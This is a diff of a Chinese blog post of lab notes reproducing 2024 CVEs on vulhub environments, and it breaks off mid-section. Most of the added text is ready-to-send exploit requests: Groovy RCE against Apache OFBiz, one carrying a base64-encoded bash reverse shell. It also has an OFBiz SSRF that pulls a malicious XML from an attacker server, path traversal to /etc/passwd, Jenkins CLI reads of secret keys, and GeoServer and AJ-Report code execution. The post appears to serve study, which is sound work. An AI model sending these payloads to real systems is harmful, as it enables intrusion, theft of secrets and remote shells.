@@ -11,7 +11,7 @@ PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）GNU C 是一个�
 # Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
 #
 # TO.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
-</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">vulhub_cve2024s</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%88%A9%E7%94%A8GNU-C-Iconv%E5%B0%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8F%98%E6%88%90RCE%EF%BC%88CVE-2024-2961%EF%BC%89"><span class="toc-text">PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nexus-Repository-Manager-3-%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-4956%EF%BC%89"><span class="toc-text">Nexus Repository Manager 3 未授权目录穿越漏洞（CVE-2024-4956）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-38856"><span class="toc-text">Apache OFBiz 身份验证绕过导致远程代码执行 (CVE-2024-38856)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2024-45195%EF%BC%89"><span class="toc-text">Apache OFBiz 身份验证绕过导致远程代码执行（CVE-2024-45195）</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E7%B4%A7%E6%80%A5%E5%A4%87%E8%80%832024"><i class="tag post-item-tag">紧急备考2024</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">vulhub_cve2024s</h1><time class="has-text-grey" datetime="2024-11-18T15:15:27.000Z">2024-11-18</time><article class="mt-2 post-content"><p>紧急备考</p>
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">vulhub_cve2024s</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%88%A9%E7%94%A8GNU-C-Iconv%E5%B0%86%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%8F%98%E6%88%90RCE%EF%BC%88CVE-2024-2961%EF%BC%89"><span class="toc-text">PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nexus-Repository-Manager-3-%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-4956%EF%BC%89"><span class="toc-text">Nexus Repository Manager 3 未授权目录穿越漏洞（CVE-2024-4956）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-38856"><span class="toc-text">Apache OFBiz 身份验证绕过导致远程代码执行 (CVE-2024-38856)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2024-45195%EF%BC%89"><span class="toc-text">Apache OFBiz 身份验证绕过导致远程代码执行（CVE-2024-45195）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84"><span class="toc-text">附</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-32113"><span class="toc-text">CVE-2024-32113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-36104"><span class="toc-text">CVE-2024-36104</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-38856"><span class="toc-text">CVE-2024-38856</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-51467"><span class="toc-text">CVE-2023-51467</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-OFBiz-SSRF-%E5%92%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-45507%EF%BC%89"><span class="toc-text">Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSRF漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jenkins-CLI-%E6%8E%A5%E5%8F%A3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-23897%EF%BC%89"><span class="toc-text">Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GeoServer-%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36401%EF%BC%89"><span class="toc-text">GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AJ-Report-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2024-15077%EF%BC%89"><span class="toc-text">AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-%E5%8F%82%E6%95%B0%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-47177%EF%BC%89"><span class="toc-text">OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E7%B4%A7%E6%80%A5%E5%A4%87%E8%80%832024"><i class="tag post-item-tag">紧急备考2024</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">vulhub_cve2024s</h1><time class="has-text-grey" datetime="2024-11-18T15:15:27.000Z">2024-11-18</time><article class="mt-2 post-content"><p>紧急备考</p>
 <h1 id="PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）"><a href="#PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）" class="headerlink" title="PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）"></a>PHP利用GNU C Iconv将文件读取变成RCE（CVE-2024-2961）</h1><p>GNU C 是一个标准的ISO C依赖库。在GNU C中，<code>iconv()</code>函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。</p>
 <p>如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用<code>iconv()</code>的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。</p>
 <p>按照要求配置好环境，下载exp：</p>
@@ -480,7 +480,8 @@ Exploit()
 <p>其3.68.0及之前版本中，存在一处目录穿越漏洞。攻击者可以利用该漏洞读取服务器上任意文件。</p>
 <p>与Orange Tsai在<a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">Blackhat US 2018</a>分享的SpringMVC CVE-2018-1271漏洞类似，Jetty的<code>URIUtil.canonicalPath()</code>函数也将空字符串认为是一个合法目录，导致了该漏洞的产生：</p>
 <p><img src="/img/2.png" alt="img"></p>
-<p>这玩意儿运行在8081端口</p>
+<p>这玩意儿运行在8081端口,界面：</p>
+<p><img src="/img/2dbae64b4b81458e8d19058af7e49e85.png" alt="img"></p>
 <h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
 Host: localhost:8081
 Accept-Encoding: gzip, deflate, br
@@ -621,4 +622,232 @@ DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./appl
 </code></pre>
 <p>这里我环境中第一次<code>DATAFILE_LOCATION=http://172.20.10.4:8000/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp</code>总是会被吞掉，服务器也没有访问记录，第二个句子能执行，再在第二句之后加一遍发现都执行成功，但是第一句不知为什么不被执行</p>
 <p>访问<code>/accounting/index.jsp?cmd=id</code>rce成功</p>
+<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><h3 id="CVE-2024-32113"><a href="#CVE-2024-32113" class="headerlink" title="CVE-2024-32113"></a>CVE-2024-32113</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14733?u_atoken=69f20c2ee3b90c47098229b498693367&u_asig=1a0c384917320260008202245e00fe">ofbiz目录遍历致代码执行漏洞（CVE-2024-32113）分析 - 先知社区</a></p>
+<p>**”..&#x2F;“<strong>和</strong>“;”**进行截断绕过filter处理</p>
+<p>直接构造 18.12.14 及之前版本通杀的路径 payload，不需要进行目录遍历。</p>
+<pre><code>/webtools/control/ListTimezones/ProgramExport?
+...
+。。。
+groovyProgram=&#39;calc.exe&#39;.execute()       
+</code></pre>
+<p><strong>18.12.13版本：</strong> 主要体现在将ListTimezones的 auth 改为 true，黑名单里增加execute关键字，ControlFilter.doFilter() 中校验了规范化前后的 url 是否一致，以此来判断 url 是否含有特殊字符。</p>
+<p><strong>18.12.14版本：</strong><br>网上使用的 payload 是将.换为%2e或;来绕过 18.12.13 版本的修复代码，于是官方在 18.12.14 版本的 ControlFilter.doFilter() 中添加过滤了%2e和;，不过仍然没有修复到问题关键。</p>
+<p><img src="/img/20240530152728-11a2b3e2-1e56-1.png" alt="img"></p>
+<p><img src="/img/20240530152735-15b0f6ba-1e56-1.png" alt="img"></p>
+<h3 id="CVE-2024-36104"><a href="#CVE-2024-36104" class="headerlink" title="CVE-2024-36104"></a>CVE-2024-36104</h3><p>由于对<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=HTTP%E8%AF%B7%E6%B1%82&spm=1001.2101.3001.7020">HTTP请求</a>URL中的特殊字符（如；、%2e）限制不当，威胁者可构造恶意请求利用该漏洞，成功利用可能导致远程代码执行。</p>
+<p>Apache OFBiz &lt; 18.12.14</p>
+<pre><code>POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+ 
+groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
+</code></pre>
+<h3 id="CVE-2024-38856"><a href="#CVE-2024-38856" class="headerlink" title="CVE-2024-38856"></a>CVE-2024-38856</h3><p>apache OFBiz 在处理 view 视图渲染的时候存在逻辑缺陷，未经身份验证的攻击者可通过构造特殊 URL 来覆盖最终的渲染视图，从而执行任意代码。</p>
+<pre><code>POST /webtools/control/main/ProgramExport HTTP/1.1
+Host: 127.0.0.1:8443
+Connection: close
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 272
+​
+groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
+</code></pre>
+<h3 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a>CVE-2023-51467</h3><p>这个漏洞的原因是对于CVE-2023-49070的不完全修复。在Apache OFBiz 18.12.10版本中，官方移除了可能导致RCE漏洞的XMLRPC组件，但没有修复权限绕过问题。来自长亭科技的安全研究员枇杷哥利用这一点找到了另一个可以导致RCE的方法：Groovy表达式注入。</p>
+<pre><code>POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1
+Host: localhost:8443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+groovyProgram=throw+new+Exception(&#39;id&#39;.execute().text);
+</code></pre>
+<pre><code>POST /webtools/control/ProgramExport/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y HTTP/1.1
+Host: localhost:8443
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+
+groovyProgram=&#39;bash+-c+&#123;echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjE3MS4xLzQ0MyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;.execute();
+</code></pre>
+<h1 id="Apache-OFBiz-SSRF-和远程代码执行漏洞（CVE-2024-45507）"><a href="#Apache-OFBiz-SSRF-和远程代码执行漏洞（CVE-2024-45507）" class="headerlink" title="Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）"></a>Apache OFBiz SSRF 和远程代码执行漏洞（CVE-2024-45507）</h1><p>Apache OFBiz 18.12.16之前的版本存在一处SSRF与远程命令执行漏洞，未经身份验证的攻击者可以利用该漏洞执行任意命令并控制服务器。</p>
+<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>向<code>/webtools/control/forgotPassword/StatsSinceStart</code>发送以下POST请求即可：</p>
+<pre><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
+Host: your-ip:8443
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+statsDecoratorLocation=http://192.168.91.148:8000
+</code></pre>
+<p>ssrf验证成功</p>
+<p>在公共服务器上创建一个恶意的XML文件（payload.xml），例如</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;screens xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xmlns=&quot;http://ofbiz.apache.org/Widget-Screen&quot; xsi:schemaLocation=&quot;http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd&quot;&gt;
+
+    &lt;screen name=&quot;StatsDecorator&quot;&gt;
+        &lt;section&gt;
+            &lt;actions&gt;
+                &lt;set value=&quot;$&#123;groovy:&#39;touch /tmp/success&#39;.execute();&#125;&quot;/&gt;
+            &lt;/actions&gt;
+        &lt;/section&gt;
+    &lt;/screen&gt;
+&lt;/screens&gt;
+</code></pre>
+<p>然后将恶意XML的URL替换进请求中发送：</p>
+<pre><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
+Host: your-ip:8443
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+statsDecoratorLocation=http://192.168.91.148:8000/payload.xml
+</code></pre>
+<p>rce success</p>
+<h1 id="Jenkins-CLI-接口任意文件读取漏洞（CVE-2024-23897）"><a href="#Jenkins-CLI-接口任意文件读取漏洞（CVE-2024-23897）" class="headerlink" title="Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）"></a>Jenkins CLI 接口任意文件读取漏洞（CVE-2024-23897）</h1><p>enkins是一个开源的自动化服务器。</p>
+<p>Jenkins使用<a target="_blank" rel="noopener" href="https://github.com/kohsuke/args4j">args4j</a>来解析命令行输入，并支持通过HTTP、Websocket等协议远程传入命令行参数。args4j中用户可以通过<code>@</code>字符来加载任意文件，这导致攻击者可以通过该特性来读取服务器上的任意文件。</p>
+<p>该漏洞影响Jenkins 2.441及以前的版本。</p>
+<p>利用该漏洞可以直接使用官方提供的命令行客户端，在<code>http://localhost:8080/jnlpJars/jenkins-cli.jar</code>下载。</p>
+<p>使用该工具读取目标服务器的<code>/proc/self/environ</code>文件，可以找到Jenkins的基础目录，<code>JENKINS_HOME=/var/jenkins_home</code>：</p>
+<pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 &quot;@/proc/self/environ&quot;
+</code></pre>
+<p><img src="/img/11.png" alt="img"></p>
+<p>（匿名情况下，只能通过命令行的报错读取文件的第一行）</p>
+<p>然后，可在该目录下读取敏感文件，如<code>secrets.key</code> or <code>master.key</code></p>
+<pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 &quot;@/var/jenkins_home/secret.key&quot;
+</code></pre>
+<p>因为开启了“匿名用户可读”选项，你也可以直接使用<code>connect-node</code>命令读取完整文件内容：</p>
+<pre><code>java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node &quot;@/etc/passwd&quot;
+</code></pre>
+<h1 id="GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）"><a href="#GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</h1><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p>
+<p>在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。</p>
+<p>在官方<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">漏洞通告</a>中提到可以找到漏洞相关的WFS方法：</p>
+<blockquote>
+<p>已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求利用此漏洞。已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求利用此漏洞。</p>
+</blockquote>
+<p>这里使用<code>GetPropertyValue</code>来执行xpath表达式。</p>
+<p>基于GET方法的POC：</p>
+<pre><code>GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#39;touch%20/tmp/success1&#39;) HTTP/1.1
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+</code></pre>
+<p><img src="/img/image-20241120001445232.png" alt="image-20241120001445232"></p>
+<p>基于POST方法的POC：</p>
+<pre><code>POST /geoserver/wfs HTTP/1.1
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/xml
+Content-Length: 356
+
+&lt;wfs:GetPropertyValue service=&#39;WFS&#39; version=&#39;2.0.0&#39;
+ xmlns:topp=&#39;http://www.openplans.org/topp&#39;
+ xmlns:fes=&#39;http://www.opengis.net/fes/2.0&#39;
+ xmlns:wfs=&#39;http://www.opengis.net/wfs/2.0&#39;&gt;
+  &lt;wfs:Query typeNames=&#39;sf:archsites&#39;/&gt;
+  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#39;touch /tmp/success2&#39;)&lt;/wfs:valueReference&gt;
+&lt;/wfs:GetPropertyValue&gt;
+</code></pre>
+<p><img src="/img/image-20241120001729204.png" alt="image-20241120001729204"></p>
+<p>修改包要调整<code>Content-Type: application/xml</code></p>
+<h1 id="AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）"><a href="#AJ-Report-认证绕过与远程代码执行漏洞（CNVD-2024-15077）" class="headerlink" title="AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）"></a>AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）</h1><p>AJ-Report是全开源的一个BI平台。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20241120221853461.png" alt="image-20241120221853461"></p>
+<p>poc </p>
+<pre><code>POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+
+Host: 127.0.0.1:9095
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: adminer_permanent=; OFBiz.Visitor=10000
+
+Content-Type: application/json;charset=UTF-8
+
+Upgrade-Insecure-Requests: 1
+
+Sec-Fetch-Dest: document
+
+Sec-Fetch-Mode: navigate
+
+Sec-Fetch-Site: none
+
+Sec-Fetch-User: ?1
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 341
+
+
+
+&#123;&quot;ParamName&quot;:&quot;&quot;,&quot;paramDesc&quot;:&quot;&quot;,&quot;paramType&quot;:&quot;&quot;,&quot;sampleItem&quot;:&quot;1&quot;,&quot;mandatory&quot;:true,&quot;requiredFlag&quot;:1,&quot;validationRules&quot;:&quot;function verification(data)&#123;a = new java.lang.ProcessBuilder(\&quot;id\&quot;).start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss=&#39;&#39;;while((line = r.readLine()) != null)&#123;ss+=line&#125;;return ss;&#125;&quot;&#125;
+</code></pre>
+<p>依然是要记得改<code>Content-Type: application/json;charset=UTF-8</code></p>
+<p>rce成功</p>
+<h1 id="OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-参数导致远程命令执行漏洞（CVE-2024-47177）"><a href="#OpenPrinting-Cups-Browsed-PDD-FoomaticRIPCommandLine-参数导致远程命令执行漏洞（CVE-2024-47177）" class="headerlink" title="OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）"></a>OpenPrinting Cups-Browsed PDD FoomaticRIPCommandLine 参数导致远程命令执行漏洞（CVE-2024-47177）</h1><p><strong>这个洞在HTB_EvilCUPS遇到过。</strong></p>
+<p>OpenPrinting CUPS（通用Unix打印系统）是为类Unix操作系统开发的开源打印系统。它允许计算机充当打印服务器，高效管理本地和网络打印机。Cups-Browsed是CUPS系统的一部分，是一个专门用于浏览网络上其他CUPS服务器共享的远程打印机的守护进程。它可以自动发现和配置网络打印机，让用户更容易访问和使用网络上共享的打印资源，无需手动设置。</p>
+<p>在Cups-Browsed 2.0.1及之前的版本中，存在一个由PPD（PostScript打印机描述）文件中的<code>FoomaticRIPCommandLine</code>参数处理不当引起的问题。攻击者可以通过创建一个恶意的IPP（互联网打印协议）服务器来利用这个漏洞，向易受攻击的Cups-Browsed实例发送精心制作的打印机信息，然后在运行易受攻击的Cups-Browsed的系统上执行任意命令。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/evil-ipp-server">vulhub&#x2F;evil-ipp-server: A evil IPP server to reproduce CVE-2024-47177</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ippsec/evil-cups">IppSec&#x2F;evil-cups</a></p>
+<blockquote>
